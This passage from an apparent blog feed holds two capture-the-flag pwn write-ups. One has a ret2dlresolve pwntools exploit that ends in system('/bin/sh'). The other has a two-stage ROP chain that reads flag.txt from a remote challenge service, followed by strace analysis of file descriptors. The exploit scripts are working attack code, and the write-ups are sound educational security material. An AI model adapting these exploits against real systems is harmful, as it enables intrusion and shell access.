\u0026#39;-h\u0026#39;] exe = \u0026#34;./void\u0026#34; elf = pwn.context.binary = pwn.elf(exe, checksec = false) rop = pwn.rop(elf) #proc = pwn.process(\u0026#34;./void\u0026#34;) #proc = pwn.gdb.debug(\u0026#34;./void\u0026#34;, gdbscript = \u0026#34;\u0026#34;\u0026#34; # b *0x000000000040113b # c # \u0026#34;\u0026#34;\u0026#34;) # important addresses plt_stub = elf.get_section_by_name(\u0026#34;.plt\u0026#34;)[\u0026#34;sh_addr\u0026#34;] bss = elf.get_section_by_name(\u0026#34;.bss\u0026#34;)[\u0026#34;sh_addr\u0026#34;] print(f\u0026#34;[*] .plt default stub at: {hex(plt_stub)}\u0026#34;) print(f\u0026#34;[*] .bss at: {hex(bss)}\u0026#34;) strtab, symtab, jmprel = map(elf.dynamic_value_by_tag, [\u0026#34;dt_strtab\u0026#34;, \u0026#34;dt_symtab\u0026#34;, \u0026#34;dt_jmprel\u0026#34;]) print(f\u0026#34;[*] strtab (.dynstr) at: {hex(strtab)}\u0026#34;) print(f\u0026#34;[*] symtab (.dynsym) at: {hex(symtab)}\u0026#34;) print(f\u0026#34;[*] jmprel (.rel.plt) at: {hex(jmprel)}\u0026#34;) def align(addr): return (0x18 - (addr) % 0x18) # payload 1 ============================= # 1. overflow into return address # 2. call read(0, .bss, size_of_fake_entries) # 3. return to vuln() \u0026#34;\u0026#34;\u0026#34; this function takes an arbitrary number of arbitrarily nested lists, tuples and dictionaries. it will then find every string and number inside those and flatten them out. strings are inserted directly while numbers are packed using the :func:`pack` function. unicode strings are utf-8 encoded. examples \u0026gt;\u0026gt;\u0026gt; flat(4) b\u0026#39;\\x04\\x00\\x00\\x00\u0026#39; \u0026gt;\u0026gt;\u0026gt; flat(b\u0026#39;x\u0026#39;) b\u0026#39;x\u0026#39; \u0026gt;\u0026gt;\u0026gt; flat([1,2,3]) b\u0026#39;\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00\u0026#39; \u0026gt;\u0026gt;\u0026gt; flat({4:b\u0026#39;x\u0026#39;}) b\u0026#39;aaaax\u0026#39; \u0026#34;\u0026#34;\u0026#34; payload_1 = pwn.flat({ 72: [ # pad 72 bytes to overwrite buffer and rbp values pwn.p64(rop.rdi.address), pwn.p64(0), # read from stdin pwn.p64(rop.rsi.address), pwn.p64(bss), # read into .bss section pwn.p64(0), # junk for pop r15 # we do not have gadget to set rdx to size of next payload stage, but it has value 0xc8 when next instruction is called, we can work with that our as next stage is much smaller than 0xc8 (200) bytes elf.sym.read, # call read() elf.symbols[\u0026#34;vuln\u0026#34;], # return to vuln() after read() ] }) proc.sendline(payload_1) # payload 2 ============================ # 1. input value into previous read(0, .bss, size) call # a. create fake elf64_rel structure (.rel.plt) # b. create fake elf64_sym structure (.dynsym) # c. write string \u0026#39;system\u0026#39; for .dynstr resolution of symbol name # d. write string \u0026#39;/bin/sh\u0026#39; for passing as argument to system later # 2. let return to vuln() as proposed in payload 1 \u0026#34;\u0026#34;\u0026#34; typedef struct { elf64_addr r_offset; /* 64 bit - address */ elf64_xword r_info; /* 64 bit - relocation type and symbol index */ elf64_sxword r_addend; /* 64 bit - addend */ } elf64_rela; // 24 bytes \u0026#34;\u0026#34;\u0026#34; # fake elf64_sym is at 24 bytes (size of fake elf64_rela - jmprel entry) after bss. index must be offset from symtab base. #dynsym_idx = ((bss + 24) - symtab) // 24 \u0026lt;-- this resulted in an index in fraction, we need to align the address to 24 byte structures. padding = align(bss - symtab) fake_structs = bss + padding dynsym_idx = ((fake_structs + 24) - symtab) // 24 r_info = (dynsym_idx \u0026lt;\u0026lt; 32) | 0x7 # fake elf64_sym entry must contain offset to symbol name from strtab. dynstr_off = (fake_structs + 48) - strtab payload_2 = pwn.flat({ 0: [ # fake elf64_rela entry for jmprel bss, # r_offset - a write address to write address of system after resolution r_info, # r_info - indexes into our fake .dynsym entry pwn.p64(0), # r_addend - zero, not needed for our purposes b\u0026#39;\\x00\u0026#39; * padding, # added padding to make 24 byte (structure size) alignment as dynsym_idx (in r_info) must be exact multiple of 24 @ss pwn.p32(dynstr_off), # st_name - offset from strtab for our symbol name pwn.p32(0) * 5, # other 20 bytes, not needed for our purposes # target symbol name to be referenced from strtab through our symtab entry \u0026#34;system\\x00\\x00\u0026#34;, # argument to system \u0026#34;/bin/sh\\x00\u0026#34;, ] }) payload_2 = payload_2 + b\u0026#39;a\u0026#39; * (200 - len(payload_2)) # proc.sendline() was buggy so i filled entire 200 byte limit in count of read() proc.send(payload_2) # payload 3 ============================ # 1. overflow into the return address # 2. push reloc_arg (that resolves to start of our fake structure region) # 3. return to plt default stub # 4. profit binsh_addr = fake_structs + 24 + 24 + 8 # start of fake structs + size of elf64_rela + size of elf64_sym + length of \u0026#39;system\\x00\\x00\u0026#39; reloc_arg = (fake_structs - jmprel) // 24 payload_3 = pwn.flat({ 72: [ pwn.p64(rop.rdi.address), # setup argument for system() pwn.p64(binsh_addr), plt_stub, # to call dl_resolve reloc_arg, # plt stub assumes that the offset to jmprel entry is already pushed ] }) proc.send(payload_3) proc.interactive() post exploitation post-exploitation i drafted a meme that looked cool to me and adhered to then meme trends.\n","title":"How are functions resolved: A jump across tables into dl_resolve"},{"date":"2024-10-05","image":"","imageAlt":"","link":"https://ashtrace.github.io/posts/tracing_file_descriptors/","summary":"\u003cp\u003eI was going through an easy (as per the challenge platform, not personal ranking) pwn challenge. After successfully pwning the binary locally, I ran my exploit against the remote challenge service and failed. Referring to the writeup document I found an explaination that didn\u0026rsquo;t satify my itch.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"./writeup-remote-section.jpeg\" alt=\"writeup-remote-section\"\u003e\u003c/p\u003e\n\u003cp\u003eThere was no explanation regarding why the value of file-descriptor was to be \u003ccode\u003e5\u003c/code\u003e. Thus I went on a quest to trace for it.\u003c/p\u003e","tags":["ctf","linux","pwn","writeup"],"text":"i was going through an easy (as per the challenge platform, not personal ranking) pwn challenge. after successfully pwning the binary locally, i ran my exploit against the remote challenge service and failed. referring to the writeup document i found an explaination that didn\u0026rsquo;t satify my itch.\nthere was no explanation regarding why the value of file-descriptor was to be 5. thus i went on a quest to trace for it.\nps: please bear with me while we fight togther to tally all those numbers :) (i tried my best to redact challenge name)\ncontext information we are provided with challenge elf binary named challengebinary, and a dockerfile to create docker container with binary and fake flag.\nexecutable mitigation information arch: amd64-64-little relro: full relro stack: no canary found nx: nx enabled pie: no pie (0x400000) stripped: no source code analysis (decompilation) main()\nint __cdecl main(int argc, const char **argv, const char **envp) { char s1[8]; // [rsp+0h] [rbp-40h] byref __int64 v5; // [rsp+8h] [rbp-38h] int v6; // [rsp+10h] [rbp-30h] __int64 buf[2]; // [rsp+20h] [rbp-20h] byref int fd; // [rsp+34h] [rbp-ch] unsigned __int64 i; // [rsp+38h] [rbp-8h] banner(argc, argv, envp); buf[0] = 0ll; buf[1] = 0ll; fd = open(\u0026#34;/dev/urandom\u0026#34;, 0); read(fd, buf, 8ull); printf(\u0026#34;\\n[strange man in mask screams some nonsense]: %s\\n\\n\u0026#34;, (const char *)buf); close(fd); *(_qword *)s1 = 0ll; v5 = 0ll; v6 = 0; printf(\u0026#34;[strange man in mask]: in order to proceed, tell us the secret phrase: \u0026#34;); __isoc99_scanf(\u0026#34;%16s\u0026#34;, s1); for ( i = 0ll; i \u0026lt;= 0xe; ++i ) { if ( s1[i] == 10 ) { s1[i] = 0; break; } } if ( !strncmp(s1, \u0026#34;s34s0nf1n4l3b00\u0026#34;, 0xfull) ) challenge_function(); else printf(\u0026#34;%s\\n[strange man in mask]: sorry, you are not allowed to enter here!\\n\\n\u0026#34;, \u0026#34;\\x1b[1;31m\u0026#34;); return 0; } the program opens up /dev/random at provides the user with 8 bytes of randomness it asks for a secret phrase (compared with s34s0nf1n4l3b00), if the phrase matches it calls challenge_function() challenge_function()\nssize_t challenge_function() { char buf[64]; // [rsp+0h] [rbp-40h] byref printf(\u0026#34;\\n[strange man in mask]: season finale is here! take this souvenir with you for good luck: [%p]\u0026#34;, buf); printf(\u0026#34;\\n\\n[strange man in mask]: now, tell us a wish for next year: \u0026#34;); fflush(stdin); fflush(_bss_start); read(0, buf, 0x1000ull); return write(1, \u0026#34;\\n[strange man in mask]: that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;, 0x54ull); } it discloses a stack address (of input buffer). it reads 4096 bytes into a 64 byte array. vulnerability as nx is enabled, but it is a no pie binary, we can possibly rop. we also have stack address leak to store data in our ropchain.\nexploitation exploit development we do not have a pop rdi ; ret gadget, but the moment challenge_function() returns, rdx stores 0x54 which would suffice for us, if flag is larger in size we would have to read it in 84 byte chunks, not an issue :).\nthe call to open() sets rdx to 0, so we return back to challenge_function() and send a second ropchain to read the flag from opened file.\nimport pwn pwn.context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] exe = \u0026#34;./challengebinary\u0026#34; elf = pwn.context.binary = pwn.elf(exe) proc = pwn.process(exe) proc.sendline(b\u0026#34;s34s0nf1n4l3b00\u0026#34;) # secret phrase proc.readuntil(b\u0026#34;[strange man in mask]: season finale is here! take this souvenir with you for good luck: [\u0026#34;) buffer_address = int(proc.readuntil(b\u0026#39;]\u0026#39;).decode()[:-1], 16) pwn.log.info(f\u0026#34;buffer\u0026#39;s stack address provided: {hex(buffer_address)}\u0026#34;) # gadgets ===================================================================== pop_rdi = 0x00000000004011f2 pop_rsi = 0x00000000004011f4 open_plt = 0x4010e0 read_plt = 0x401090 write_plt = 0x401050 padding = 64 + 8 # buffer size + rbp size ropchain_stage1 = pwn.flat({ 0: [ b\u0026#34;flag.txt\\0\u0026#34;, b\u0026#39;a\u0026#39; * (padding - len(b\u0026#34;flag.txt\\0\u0026#34;)), pwn.p64(pop_rdi), pwn.p64(buffer_address), pwn.p64(pop_rsi), pwn.p64(0), pwn.p64(open_plt), # open(\u0026#34;flag.txt\u0026#34;, o_rdonly), file descriptor returned for \u0026#34;flag.txt\u0026#34; would be 3 if program closed all the files it had opened before this call pwn.p64(elf.symbols[\u0026#34;finale\u0026#34;]) ] }) # call to open() sets rdx to 0 proc.sendline(ropchain_stage1) proc.readrepeat(1) ropchain_stage2 = pwn.flat({ padding: [ pwn.p64(pop_rdi), pwn.p64(3), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(read_plt), # read(3, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it pwn.p64(pop_rdi), pwn.p64(1), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(write_plt), # write(stdout, buffer, 84) ] }) proc.sendline(ropchain_stage2) proc.readuntil(b\u0026#34;that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;); pwn.log.info(f\u0026#34;flag: {proc.readline().decode()}\u0026#34; the script worked locally, but failed on remote instance.\ntroubleshooting i made slight change to the dockerfile to install strace and use it to trace my calls\nfrom ubuntu:20.04 env debian_frontend noninteractive run apt-get update --fix-missing \u0026amp;\u0026amp; apt-get -y upgrade run apt-get install -y socat strace run useradd -m ctf copy challenge/* /home/ctf/ run chown -r ctf:ctf /home/ctf/ workdir /home/ctf user ctf expose 9001/tcp entrypoint [\u0026#34;strace\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;socat\u0026#34;, \u0026#34;tcp-listen:9001,fork\u0026#34;, \u0026#34;exec:\u0026#39;./challengebinary\u0026#39;\u0026#34;] when i ran my exploit against the docker container, i observed that contrary to my assumption of fd being 3, when flag.txt was opened it was assigned 5 fd number.\n~$ docker run -it -p 9001:9001 --rm --name=challengebinary challenge | grep open openat(at_fdcwd, \u0026#34;/etc/ld.so.cache\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libwrap.so.0\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libutil.so.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libssl.so.1.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libcrypto.so.1.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libnsl.so.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libpthread.so.0\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34;, o_rdonly|o_cloexec) = 3 [pid 11] openat(at_fdcwd, \u0026#34;/etc/ld.so.cache\u0026#34;, o_rdonly|o_cloexec) = 5 [pid 11] openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;, o_rdonly|o_cloexec) = 5 [pid 11] openat(at_fdcwd, \u0026#34;/dev/urandom\u0026#34;, o_rdonly \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... openat resumed\u0026gt;) = 5 [pid 11] openat(at_fdcwd, \u0026#34;flag.txt\u0026#34;, o_rdonly \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... openat resumed\u0026gt;) = 5 updating the exploit script, it worked for remote instance\nfinal exploit script import pwn pwn.context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] exe = \u0026#34;./challengebinary\u0026#34; elf = pwn.context.binary = pwn.elf(exe) proc = pwn.remote(\u0026#34;83.136.251.168\u0026#34;, 39139) proc.sendline(b\u0026#34;s34s0nf1n4l3b00\u0026#34;) # secret phrase proc.readuntil(b\u0026#34;[strange man in mask]: season finale is here! take this souvenir with you for good luck: [\u0026#34;) buffer_address = int(proc.readuntil(b\u0026#39;]\u0026#39;).decode()[:-1], 16) pwn.log.info(f\u0026#34;buffer\u0026#39;s stack address provided: {hex(buffer_address)}\u0026#34;) # gadgets ===================================================================== pop_rdi = 0x00000000004011f2 pop_rsi = 0x00000000004011f4 open_plt = 0x4010e0 read_plt = 0x401090 write_plt = 0x401050 padding = 64 + 8 # buffer size + rbp size ropchain_stage1 = pwn.flat({ 0: [ b\u0026#34;flag.txt\\0\u0026#34;, b\u0026#39;a\u0026#39; * (padding - len(b\u0026#34;flag.txt\\0\u0026#34;)), pwn.p64(pop_rdi), pwn.p64(buffer_address), pwn.p64(pop_rsi), pwn.p64(0), pwn.p64(open_plt), # open(\u0026#34;flag.txt\u0026#34;, o_rdonly), file descriptor returned for \u0026#34;flag.txt\u0026#34; 5 (found from troubleshooting) pwn.p64(elf.symbols[\u0026#34;finale\u0026#34;]) ] }) # call to open() sets rdx to 0 with open(\u0026#34;exploit\u0026#34;, \u0026#34;wb+\u0026#34;) as f: f.write(b\u0026#34;s34s0nf1n4l3b00\\n\u0026#34;) f.write(ropchain_stage1) proc.sendline(ropchain_stage1) proc.readrepeat(1) ropchain_stage2 = pwn.flat({ padding: [ pwn.p64(pop_rdi), pwn.p64(5), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(read_plt), # read(5, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it pwn.p64(pop_rdi), pwn.p64(1), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(write_plt), # write(stdout, buffer, 84) ] }) proc.sendline(ropchain_stage2) proc.readuntil(b\u0026#34;that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;); pwn.log.info(f\u0026#34;flag: {proc.readline().decode()}\u0026#34;) digging deeper why did open() return 5?\nupon reading through strace logs, i found that socat registered 3, 4 for socketpair (socketpair are 2 file descriptors used for inter-process communication, they are bi-directional in nature. usually before forking a process creates a pair and then parent and child use one fd from the pair for read/write while close the other), while 5 was used for socket connection, and the newly created conenction was assigned 6.\nsocketpair(af_unix, sock_dgram, 0, [3, 4]) = 0 ... socket(af_inet, sock_stream, ipproto_tcp) = 5 bind(5, {sa_family=af_inet, sin_port=htons(9001), sin_addr=inet_addr(\u0026#34;0.0.0.0\u0026#34;)}, 16) = 0 getsockname(5, {sa_family=af_inet, sin_port=htons(9001), sin_addr=inet_addr(\u0026#34;0.0.0.0\u0026#34;)}, [16]) = 0 listen(5, 5) ... accept(5, {sa_family=af_inet, sin_port=htons(42340), sin_addr=inet_addr(\u0026#34;172.17.0.1\u0026#34;)}, [16]) = 6 once i run my exploit, 2 new processes are created pid 9, 10\npid 9 closed the socket connection and was out of the picture.\n[pid 9] close(6) = 0 meanwhile, pid 10 (returned by the original clone() call), closed 3, 4 and re-registered the socketpair. it further registered a new socket pair 5, 7 after closing the socket 5. but this one kept fd 6 pointing to current connection. next, it **clone()**s again to create pid 11. finally it closes 7, thus it would be using 5 for communication\nclone(child_stack=null, flags=clone_child_cleartid|clone_child_settid|sigchld, child_tidptr=0x7f06e36fda10) = 10 [pid 10] close(4 \u0026lt;unfinished ...\u0026gt; [pid 10] \u0026lt;... close resumed\u0026gt;) = 0 [pid 10] close(3) = 0 [pid 10] socketpair(af_unix, sock_dgram, 0, [3, 4]) = 0 ... [pid 10] close(5) = 0 [pid 10] socketpair(af_unix, sock_stream, 0, [5, 7]) = 0 ... [pid 10] clone(child_stack=null, flags=clone_child_cleartid|clone_child_settid|sigchldstrace: process 11 attached \u0026lt;unfinished ...\u0026gt; ... [pid 10] close(7) and finally, pid 11 closed 3, 4, 5 (socketpairs created by pid 10). re-creates two socketpairs 3-4. duplicated 7 as stdin and stdout and closed 7. finally pid 11 loads finale binary into memory.\n[pid 11] close(4 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 [pid 11] close(3 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 ... [pid 11] socketpair(af_unix, sock_dgram, 0 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... socketpair resumed\u0026gt;, [3, 4]) = 0 ... [pid 11] close(5 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 ... [pid 11] dup2(7, 0 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... dup2 resumed\u0026gt;) = 0 [pid 11] dup2(7, 1 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... dup2 resumed\u0026gt;) = 1 [pid 11] close(7) = 0 [pid 11] execve(\u0026#34;./challengebinary\u0026#34;, [\u0026#34;./challengebinary\u0026#34;], 0x5603cdb74e40 /* 12 vars */ \u0026lt;unfinished ...\u0026gt; when finale was loaded, it had following file descriptors\n0 - pointing to socketpair to communicate with pid 10 1 - pointing to socketpair to communicate with pid 10 2 - stderr 3 - pointing to socketpair it (pid 11) created 4 - pointing to socketpair it (pid 11) created 5 - free thus, 5 was allocated to all subsequent **open()**s\n","title":"Tracing file descriptors: A battle against poor writeups"}]
}

